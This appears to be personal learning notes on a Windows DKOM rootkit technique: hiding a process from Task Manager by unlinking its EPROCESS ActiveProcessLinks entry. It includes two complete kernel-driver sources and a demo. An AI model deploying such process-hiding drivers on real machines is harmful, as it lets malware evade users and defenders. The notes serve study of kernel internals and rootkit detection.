<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Hide a Process</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Hide a Process</h1></strong><br />You can hide a process from userland applications by dropping it from the <code>LIST_ENTRY</code> list.<br /><br />• <a href="https://blog.landhb.dev/posts/v9eRa/a-basic-windows-dkom-rootkit-pt-1/">https://blog.landhb.dev/posts/v9eRa/a-basic-windows-dkom-rootkit-pt-1/</a><br />• <a href="https://github.com/landhb/HideProcess">https://github.com/landhb/HideProcess</a><br />• <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland">https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland</a><br />• <a href="https://github.com/nbqofficial/CTHD/blob/master/HiddenDragon/Driver.c">https://github.com/nbqofficial/CTHD/blob/master/HiddenDragon/Driver.c</a><br /><br />Tested on <code>Windows 10 Pro x64 Version 2004 19041.572</code><br /><br />For removing the process from the list, you could also use <code>RemoveEntryList</code> ??<br />Just found it.<br /><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-removeentrylist">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-removeentrylist</a><br /><br /><strong><h2>## Before you read</h2></strong><br />• If you have problems loading the driver / get <code>Access Denied</code> from OSR Driver Loader, try compiling with <code>/integritycheck</code><br /><a href=""><img src="images/1825-1.png" alt="images/1825-1.png" /></a><br /><br /><strong><h2>## About</h2></strong><br />Pre-requisite information you need to know.<br /><br /><strong><h3>### EPROCESS Struct</h3></strong><br />• <a href="https://www.nirsoft.net/kernel_struct/vista/EPROCESS.html">https://www.nirsoft.net/kernel_struct/vista/EPROCESS.html</a> (Vista example)<br /><br />The <code>EPROCESS</code> struct is a kernel structure that contains information about a running process:<br />name, creation time, its size in memory, etc.<br /><br />Every process on the system has an <code>EPROCESS</code> struct.<br /><br />This is the start of the <code>EPROCESS</code> struct on my <code>Windows 10 Pro x64 Version 2004 19041.572</code> machine<br />(retrieved with WinDbg using <code>dt _eprocess</code>)<br /><div class="codebox"><div class="codebox">nt!_EPROCESS<br />&nbsp;&nbsp;&nbsp;+0x000&nbsp;Pcb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_KPROCESS<br />&nbsp;&nbsp;&nbsp;+0x438&nbsp;ProcessLock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_EX_PUSH_LOCK<br />&nbsp;&nbsp;&nbsp;+0x440&nbsp;UniqueProcessId&nbsp;&nbsp;:&nbsp;Ptr64&nbsp;Void<br />&nbsp;&nbsp;&nbsp;+0x448&nbsp;ActiveProcessLinks&nbsp;:&nbsp;_LIST_ENTRY<br />&nbsp;&nbsp;&nbsp;+0x458&nbsp;RundownProtect&nbsp;&nbsp;&nbsp;:&nbsp;_EX_RUNDOWN_REF<br />&nbsp;&nbsp;&nbsp;+0x460&nbsp;Flags2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Uint4B<br />&nbsp;&nbsp;&nbsp;+0x460&nbsp;JobNotReallyActive&nbsp;:&nbsp;Pos&nbsp;0,&nbsp;1&nbsp;Bit<br />&nbsp;&nbsp;&nbsp;+0x460&nbsp;AccountingFolded&nbsp;:&nbsp;Pos&nbsp;1,&nbsp;1&nbsp;Bit<br />&nbsp;&nbsp;&nbsp;+0x460&nbsp;NewProcessReported&nbsp;:&nbsp;Pos&nbsp;2,&nbsp;1&nbsp;Bit<br />&nbsp;&nbsp;&nbsp;+0x460&nbsp;ExitProcessReported&nbsp;:&nbsp;Pos&nbsp;3,&nbsp;1&nbsp;Bit<br />&nbsp;&nbsp;&nbsp;...</div></div><br /><br />The part of the EPROCESS struct we&#39;re interested in, for hiding a process, is the <code>ActiveProcessLinks</code> entry.<br /><code>ActiveProcessLinks</code> points to the <code>LIST_ENTRY</code> data structure.<br /><br /><strong><h3>### LIST_ENTRY</h3></strong><br />• <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry">https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry</a><br /><br /><code>LIST_ENTRY</code> is how Windows keeps track of processes running on the system.<br />Each <code>LIST_ENTRY</code> struct stores:<br />• the process running before it in the list - <code>Blink</code> (backward link)<br />• and the process running after it in the list - <code>Flink</code> (forward link)<br /><br /><a href=""><img src="images/1825-2.png" alt="images/1825-2.png" /></a><br /><br />Our process is <code>notepad.exe</code>.<br />In the diagram above we can see that the process before us - pointed to by <code>Blink</code> - is <code>firefox.exe</code>,<br />The process after us - pointed to by <code>Flink</code> - is <code>chrome.exe</code>.<br /><br />When programs like Task Manager list the running programs on your system, it simply walks the <code>LIST_ENTRY</code> list until it loops back around to itself, at which point it has found every program.<br /><br /><strong><h3>### How to Hide A Process</h3></strong><br />To hide a process, we simply have remove our target process - in this case <code>notepad.exe</code> - from the <code>LIST_ENTRY</code> list.<br /><br />To do this:<br />• we modify the previous process&#39;s <code>Flink</code> - firefox.exe - to point forwards to <code>chrome.exe</code> (instead of notepad)<br />• and modify the next process&#39;s <code>Blink</code> - chrome.exe - to point backwards to <code>firefox.exe</code> (instead of notepad)<br /><br />That way, our process <code>notepad.exe</code> has effecitvely been dropped from the <code>LIST_ENTRY</code> list  and won&#39;t ever be found by walking the LIST_ENTRY list.<br /><br /><a href=""><img src="images/1825-3.png" alt="images/1825-3.png" /></a><br /><br />To prevent a BSOD when our hidden process exits, we modify our hidden process to point to itself.<br /><br /><strong><h3>### The Problem with PatchGuard</h3></strong><br />PatchGuard is a Windows protection that prevents the modification of core kernel system structures.<br /><code>LIST_ENTRY</code> is one of those core kernel system structures.<br />When PatchGuard detects a modification, it will BSOD your system.<br /><br />As a result, because we&#39;ve modified <code>LIST_ENTRY</code>, you computer crash will after an unspecified amount of time -  30 minutes, 1 hour, 3 hours, whatever. There&#39;s no definitive answer on how long it&#39;ll take.<br /><br /><strong><h2>## Code</h2></strong><br />There are 2 problems with implementing the code to hide a process:<br />• you need the <code>EPROCESS</code> struct of the process you want to hide<br />• you need to grab the pointer to <code>LIST_ENTRY</code> from <code>EPROCESS.ActiveProcessLinks</code><br />   ◇ except that the offset to <code>ActiveProcessLinks</code> in <code>EPROCESS</code> changes frequently with each Windows version and EPROCESS is an undocumented structure, meaning you can&#39;t just grab it with <code>EPROCESS.ActiveProcessLinks</code><br /><br />As a result, there is an easy way and a hard way to writing your code.<br />When learning this, I only ever found the hard way (which means that my easy way probably has big problems with it, apart from the obvious ones).<br /><br /><strong><h3>### Easy Way</h3></strong><br /><code>PsSetCreateProcessNotifyRoutineEx</code> will grab the EPROCESS struct of created processes for you.<br /><br />Therefore, we can set up a notification on processes being created with <code>PsSetCreateProcessNotifyRoutineEx</code>, check if it&#39;s the process we want to hide, and if it is - pass the <code>EPROCESS</code> struct to our <code>HideProcess</code> function.<br /><br />Then, to get the <code>LIST_ENTRY</code> struct of our process, we can simply find the offset to <code>ActiveProcessLinks</code> in <code>EPROCESS</code> for our specific version of Windows and hard code it (this really isn&#39;t ideal, but it&#39;s easy). <br /><br />e.g.<br /><div class="codebox"><div class="codebox">#define&nbsp;ActiveProcessLinks_offset&nbsp;0x448<br /><br />PLIST_ENTRY&nbsp;current_process_listentry&nbsp;=&nbsp;current_EPROCESS&nbsp;+&nbsp;ActiveProcessLinks_offset</div></div><br /><br />To find the offset to <code>ActiveProcessLinks</code> on your version of Windows, use WinDbg and run <code>dt _eprocess</code><br /><a href=""><img src="images/1825-4.png" alt="images/1825-4.png" /></a><br /><br />There are also some websites and tools to get it:<br />• <a href="https://ntdiff.github.io/">https://ntdiff.github.io/</a><br />• <a href="https://github.com/wbenny/pdbex">https://github.com/wbenny/pdbex</a><br />• <a href="https://www.vergiliusproject.com/kernels/x64">https://www.vergiliusproject.com/kernels/x64</a><br /><br /><strong><h4>#### Example Code</h4></strong><br />Here&#39;s the code for the easy way.<br />It&#39;s well commented so I shouldn&#39;t need to explain it.<br /><div class="codebox"><div class="codebox">/*<br />Kernel&nbsp;driver&nbsp;to&nbsp;hide&nbsp;a&nbsp;process&nbsp;from&nbsp;userland&nbsp;applications&nbsp;by&nbsp;dropping&nbsp;it&nbsp;from&nbsp;the&nbsp;LIST_ENTRY&nbsp;list.<br />This&nbsp;is&nbsp;the&nbsp;easy&nbsp;way.<br /><br />SUMMARY:<br />A&nbsp;notification&nbsp;is&nbsp;set&nbsp;for&nbsp;when&nbsp;processes&nbsp;are&nbsp;created&nbsp;with&nbsp;PsSetCreateProcessNotifyRoutineEx.<br />When&nbsp;a&nbsp;process&nbsp;is&nbsp;created&nbsp;we&nbsp;grab&nbsp;it&#39;s&nbsp;name.&nbsp;<br />If&nbsp;it&#39;s&nbsp;the&nbsp;process&nbsp;we&nbsp;want&nbsp;to&nbsp;hide,&nbsp;we&nbsp;pass&nbsp;the&nbsp;EPROCESS&nbsp;struct&nbsp;of&nbsp;the&nbsp;created&nbsp;process&nbsp;to&nbsp;our&nbsp;HideProcess&nbsp;function.<br />HideProcess&nbsp;grabs&nbsp;the&nbsp;LIST_ENTRY&nbsp;of&nbsp;the&nbsp;process&nbsp;we&nbsp;want&nbsp;to&nbsp;hide,&nbsp;and&nbsp;the&nbsp;2&nbsp;processes&nbsp;either&nbsp;side&nbsp;of&nbsp;it.<br />We&nbsp;then&nbsp;drop&nbsp;our&nbsp;target&nbsp;process&nbsp;from&nbsp;the&nbsp;LIST_ENTRY&nbsp;list&nbsp;by&nbsp;having&nbsp;the&nbsp;2&nbsp;processes&nbsp;either&nbsp;side&nbsp;point&nbsp;to&nbsp;each&nbsp;other&nbsp;(instead&nbsp;of&nbsp;our&nbsp;target&nbsp;process).<br /><br />NOTE:<br />-&nbsp;The&nbsp;offset&nbsp;to&nbsp;ActiveProcessLinks&nbsp;in&nbsp;EPROCESS&nbsp;changes&nbsp;between&nbsp;Windows&nbsp;version.&nbsp;Find&nbsp;the&nbsp;offset&nbsp;for&nbsp;your&nbsp;Windows&nbsp;verison&nbsp;and&nbsp;CHANGE&nbsp;IT<br /><br />PROBLEMS:<br />-&nbsp;Limited&nbsp;to&nbsp;hiding&nbsp;only&nbsp;newly-created&nbsp;processes<br />	-&nbsp;so&nbsp;there&#39;s&nbsp;no&nbsp;hiding&nbsp;a&nbsp;process&nbsp;that&#39;s&nbsp;been&nbsp;started&nbsp;before&nbsp;this&nbsp;driver&nbsp;was&nbsp;loaded<br />-&nbsp;Not&nbsp;usable&nbsp;across&nbsp;different&nbsp;Windows&nbsp;versions&nbsp;because&nbsp;the&nbsp;offset&nbsp;to&nbsp;ActiveProcessLinks&nbsp;in&nbsp;EPROCESS&nbsp;changes&nbsp;frequently,&nbsp;and&nbsp;here&nbsp;it&#39;s&nbsp;hard&nbsp;coded<br />*/<br /><br />#include&nbsp;&lt;ntifs.h&gt;<br />#include&nbsp;&lt;ntddk.h&gt;<br />#include&nbsp;&lt;wdf.h&gt;<br /><br />#define&nbsp;PROCESS_TO_HIDE&nbsp;L&quot;notepad&quot;<br />#define&nbsp;ACTIVEPROCESSLINKS_OFFSET&nbsp;0x448		//&nbsp;for&nbsp;Windows&nbsp;10&nbsp;Pro&nbsp;x64&nbsp;Version&nbsp;2004&nbsp;19041.264<br /><br />void&nbsp;HideProcess(PEPROCESS&nbsp;current_EPROCESS)<br />{<br />	//&nbsp;grab&nbsp;LIST_ENTRY&nbsp;structs&nbsp;of&nbsp;the&nbsp;current,&nbsp;previous,&nbsp;and&nbsp;next&nbsp;processes&nbsp;in&nbsp;the&nbsp;list<br />	PLIST_ENTRY&nbsp;current_listentry&nbsp;=&nbsp;(PLIST_ENTRY)((DWORD_PTR)current_EPROCESS&nbsp;+&nbsp;ACTIVEPROCESSLINKS_OFFSET);<br />	PLIST_ENTRY&nbsp;previous_listentry&nbsp;=&nbsp;current_listentry-&gt;Blink;<br />	PLIST_ENTRY&nbsp;next_listentry&nbsp;=&nbsp;current_listentry-&gt;Flink;<br /><br />	//&nbsp;drop&nbsp;the&nbsp;process&nbsp;to&nbsp;hide&nbsp;from&nbsp;the&nbsp;LIST_ENTRY&nbsp;list<br />	previous_listentry-&gt;Flink&nbsp;=&nbsp;next_listentry;						//&nbsp;modify&nbsp;the&nbsp;previous&nbsp;process&#39;s&nbsp;FLINK&nbsp;to&nbsp;point&nbsp;forwards&nbsp;to&nbsp;the&nbsp;next&nbsp;process<br />	next_listentry-&gt;Blink&nbsp;=&nbsp;previous_listentry;						//&nbsp;modify&nbsp;the&nbsp;next&nbsp;process&#39;s&nbsp;BLINK&nbsp;to&nbsp;point&nbsp;backwards&nbsp;to&nbsp;the&nbsp;previous&nbsp;process<br />	<br />	DbgPrint(&quot;\t&nbsp;skipped&nbsp;over&nbsp;process&nbsp;in&nbsp;list&nbsp;\n&quot;);<br /><br />	//&nbsp;rewrite&nbsp;the&nbsp;FLINK&nbsp;and&nbsp;BLINK&nbsp;of&nbsp;our&nbsp;process&nbsp;to&nbsp;point&nbsp;to&nbsp;itself&nbsp;(circular)<br />	current_listentry-&gt;Blink&nbsp;=&nbsp;(PLIST_ENTRY)&amp;current_listentry-&gt;Flink;<br />	current_listentry-&gt;Flink&nbsp;=&nbsp;(PLIST_ENTRY)&amp;current_listentry-&gt;Flink;<br /><br />	DbgPrint(&quot;\t&nbsp;current&nbsp;process&nbsp;now&nbsp;points&nbsp;to&nbsp;itself&nbsp;\n&quot;);<br /><br />	return;<br />}<br /><br />/*<br />Routine&nbsp;that&nbsp;runs&nbsp;on&nbsp;process&nbsp;creation.<br />*/<br />void&nbsp;notify_CreateProcessEx(PEPROCESS&nbsp;process_info,&nbsp;HANDLE&nbsp;process_id,&nbsp;PPS_CREATE_NOTIFY_INFO&nbsp;creation_info)<br />{<br />	if&nbsp;(creation_info&nbsp;!=&nbsp;NULL)<br />	{<br />		//&nbsp;grab&nbsp;created&nbsp;process&#39;s&nbsp;name<br />		PWCH&nbsp;process_name&nbsp;=&nbsp;creation_info-&gt;CommandLine-&gt;Buffer;<br /><br />		//&nbsp;if&nbsp;it&#39;s&nbsp;the&nbsp;process&nbsp;we&nbsp;want&nbsp;to&nbsp;hide,&nbsp;hide&nbsp;it<br />		if&nbsp;(wcsstr(process_name,&nbsp;PROCESS_TO_HIDE)&nbsp;!=&nbsp;NULL)<br />		{<br />			DbgPrint(&quot;[!]&nbsp;notepad&nbsp;found!&nbsp;\n\t&nbsp;eprocess&nbsp;@&nbsp;0x%p&nbsp;\n\t&nbsp;list_entry&nbsp;@&nbsp;0x%p&nbsp;\n\t&nbsp;hiding...&nbsp;\n&quot;,&nbsp;process_info,&nbsp;(DWORD_PTR)process_info&nbsp;+&nbsp;ACTIVEPROCESSLINKS_OFFSET);<br />			HideProcess(process_info);<br />		}<br /><br />	}<br />	else&nbsp;if&nbsp;(creation_info&nbsp;==&nbsp;NULL)<br />	{<br />		DbgPrint(&quot;[-]&nbsp;process&nbsp;%d&nbsp;exited&nbsp;\n&quot;,&nbsp;process_id);<br />	}<br /><br />	return;<br />}<br /><br />void&nbsp;DriverUnload(PDRIVER_OBJECT&nbsp;DriverObject)<br />{<br />	UNREFERENCED_PARAMETER(DriverObject);<br /><br />	//&nbsp;remove&nbsp;set&nbsp;notifications<br />	PsSetCreateProcessNotifyRoutineEx(notify_CreateProcessEx,&nbsp;TRUE);<br /><br />	DbgPrint(&quot;[*]&nbsp;driver&nbsp;unloaded&nbsp;\n&quot;);<br /><br />	return;<br />}<br /><br />NTSTATUS&nbsp;DriverEntry(PDRIVER_OBJECT&nbsp;DriverObject,&nbsp;PUNICODE_STRING&nbsp;RegistryPath)<br /><span style="color:#000000;font-weight:400">{</span><br />	UNREFERENCED_PARAMETER(DriverObject);<br />	UNREFERENCED_PARAMETER(RegistryPath);<br />	NTSTATUS&nbsp;nt_status&nbsp;=&nbsp;STATUS_SUCCESS;<br /><br />	DriverObject-&gt;DriverUnload&nbsp;=&nbsp;DriverUnload;<br /><br />	//&nbsp;start<br />	DbgPrint(&quot;[*]&nbsp;driver&nbsp;loaded&nbsp;\n&quot;);<br /><br />	//&nbsp;notifications<br />	nt_status&nbsp;=&nbsp;PsSetCreateProcessNotifyRoutineEx(notify_CreateProcessEx,&nbsp;FALSE);<br /><br />	return&nbsp;nt_status;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong>#### Demo</strong><br />A debuggee machine is running our kernel driver.<br />A debugger machine is running WinDbg and is connected to the debuggee machine.<br /><br />I&#39;m loading the driver with OSR Driver Loader.<br />On the debuggee machine I <code>Register Service</code> and <code>Start Service</code>.<br />Our kernel driver to hide processes is now running.<br /><a href=""><img src="images/1825-5.png" alt="images/1825-5.png" /></a><br /><br />On the debuggee machine I open <code>notepad</code>.<br />Notepad is clearly running, but it doesn&#39;t appear in Task Manager.<br /><a href=""><img src="images/1825-6.png" alt="images/1825-6.png" /></a><br /><br />Back on the debugging machine running <code>WinDbg</code>, we can see that notepad was detected and we successfully removed the process the LIST_ENTRY list.<br /><a href=""><img src="images/1825-7.png" alt="images/1825-7.png" /></a><br /><br /><h2>### Simple code v2</h2><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;ntifs.h&gt;<br />#include&nbsp;&lt;windef.h&gt;<br />#include&nbsp;&lt;ntddk.h&gt;<br />#include&nbsp;&lt;wdf.h&gt;<br /><br />#define&nbsp;Dbg(...)&nbsp;DbgPrintEx(&nbsp;DPFLTR_SYSTEM_ID,&nbsp;DPFLTR_ERROR_LEVEL,&nbsp;&quot;[piddb]&nbsp;&quot;&nbsp;__VA_ARGS__&nbsp;)<br /><br />#define&nbsp;ACTIVEPROCESSLINKS_OFFSET&nbsp;0x448<br />/*<br />NOTE:&nbsp;The&nbsp;LIST_ENTRY&nbsp;struct&nbsp;is&nbsp;PatchGuard&nbsp;protected.&nbsp;<br />By&nbsp;messing&nbsp;with&nbsp;it&nbsp;you&nbsp;cause&nbsp;blue&nbsp;screens.<br />*/<br />BOOL&nbsp;RemoveProcessFromLIST_ENTRY()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;/*<br />&nbsp;&nbsp;&nbsp;&nbsp;We&nbsp;need&nbsp;the&nbsp;target&nbsp;process&nbsp;to&nbsp;hide&#39;s&nbsp;EPROCESS.<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Can&nbsp;get&nbsp;this&nbsp;from&nbsp;PID&nbsp;+&nbsp;PsLookupProcessByProcessId<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;can&nbsp;send&nbsp;process&nbsp;from&nbsp;userland.<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Or&nbsp;set&nbsp;PsSetCreateProcessNotifyRoutineEx&nbsp;and&nbsp;watch&nbsp;for&nbsp;process&nbsp;name.<br />&nbsp;&nbsp;&nbsp;&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD32&nbsp;tgt_pid&nbsp;=&nbsp;20212;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Hardcoded&nbsp;for&nbsp;demo&nbsp;purposes.&nbsp;CHANGE&nbsp;EACH&nbsp;RUN!<br />&nbsp;&nbsp;&nbsp;&nbsp;PEPROCESS&nbsp;tgt_eproc&nbsp;=&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;NTSTATUS&nbsp;status&nbsp;=&nbsp;PsLookupProcessByProcessId((HANDLE)tgt_pid,&nbsp;&amp;tgt_eproc);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!NT_SUCCESS(status))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;FALSE;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;/*<br />&nbsp;&nbsp;&nbsp;&nbsp;From&nbsp;the&nbsp;EPROCESS&nbsp;struct&nbsp;we&nbsp;want&nbsp;ActiveProcessLinks.<br />&nbsp;&nbsp;&nbsp;&nbsp;EPROCESS&nbsp;is&nbsp;undocumented,&nbsp;so&nbsp;can&#39;t&nbsp;just&nbsp;entry-&gt;ActiveProcessLinks,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;so&nbsp;have&nbsp;to&nbsp;use&nbsp;hardcoded&nbsp;offset&nbsp;(not&nbsp;ideal).<br />&nbsp;&nbsp;&nbsp;&nbsp;Grab&nbsp;offset&nbsp;from&nbsp;WinDbg:&nbsp;attach&nbsp;to&nbsp;kernel&nbsp;and&nbsp;run&nbsp;`dt&nbsp;_EPROCESS`.<br />&nbsp;&nbsp;&nbsp;&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;PLIST_ENTRY&nbsp;tgt_entry&nbsp;=&nbsp;(PLIST_ENTRY)((uintptr_t)tgt_eproc&nbsp;+&nbsp;ACTIVEPROCESSLINKS_OFFSET);<br />&nbsp;&nbsp;&nbsp;&nbsp;PLIST_ENTRY&nbsp;prev_entry&nbsp;=&nbsp;tgt_entry-&gt;Blink;<br />&nbsp;&nbsp;&nbsp;&nbsp;PLIST_ENTRY&nbsp;next_entry&nbsp;=&nbsp;tgt_entry-&gt;Flink;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;/*<br />&nbsp;&nbsp;&nbsp;&nbsp;Drop&nbsp;the&nbsp;tgt_entry&nbsp;from&nbsp;the&nbsp;LIST_ENTRY&nbsp;list&nbsp;by&nbsp;having:<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;the&nbsp;previous&nbsp;entry&nbsp;point&nbsp;to&nbsp;the&nbsp;next&nbsp;entry<br />&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;and&nbsp;the&nbsp;next&nbsp;entry&nbsp;point&nbsp;to&nbsp;the&nbsp;previous&nbsp;entry<br />&nbsp;&nbsp;&nbsp;&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;prev_entry-&gt;Flink&nbsp;=&nbsp;next_entry;<br />&nbsp;&nbsp;&nbsp;&nbsp;next_entry-&gt;Blink&nbsp;=&nbsp;prev_entry;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;/*<br />&nbsp;&nbsp;&nbsp;&nbsp;To&nbsp;prevent&nbsp;BSOD&nbsp;when&nbsp;our&nbsp;hidden&nbsp;proc&nbsp;exits,<br />&nbsp;&nbsp;&nbsp;&nbsp;make&nbsp;hidden&nbsp;proc&nbsp;point&nbsp;to&nbsp;itself<br />&nbsp;&nbsp;&nbsp;&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;tgt_entry-&gt;Blink&nbsp;=&nbsp;tgt_entry;<br />&nbsp;&nbsp;&nbsp;&nbsp;tgt_entry-&gt;Flink&nbsp;=&nbsp;tgt_entry;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ObDereferenceObject(tgt_eproc);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;TRUE;<br />}<br /><br />void&nbsp;DriverUnload(PDRIVER_OBJECT&nbsp;DriverObject)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Nothing&nbsp;to&nbsp;delete<br />&nbsp;&nbsp;&nbsp;&nbsp;UNREFERENCED_PARAMETER(DriverObject);<br />&nbsp;&nbsp;&nbsp;&nbsp;Dbg(&quot;+&nbsp;Unloaded&nbsp;driver&nbsp;\n&quot;);<br />}<br /><br />NTSTATUS&nbsp;DriverEntry(PDRIVER_OBJECT&nbsp;DriverObject,&nbsp;PUNICODE_STRING&nbsp;RegistryPath)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;UNREFERENCED_PARAMETER(RegistryPath);<br />&nbsp;&nbsp;&nbsp;&nbsp;NTSTATUS&nbsp;status&nbsp;=&nbsp;STATUS_SUCCESS;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Not&nbsp;creating&nbsp;an&nbsp;io&nbsp;device&nbsp;and&nbsp;symbolic&nbsp;link<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;because&nbsp;don&#39;t&nbsp;need&nbsp;to&nbsp;access&nbsp;from&nbsp;userland<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;DriverObject-&gt;DriverUnload&nbsp;=&nbsp;DriverUnload;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;RemoveProcessFromLIST_ENTRY();<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;status;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### Hard Way</h3></strong><br /></div>
</body>
</html>
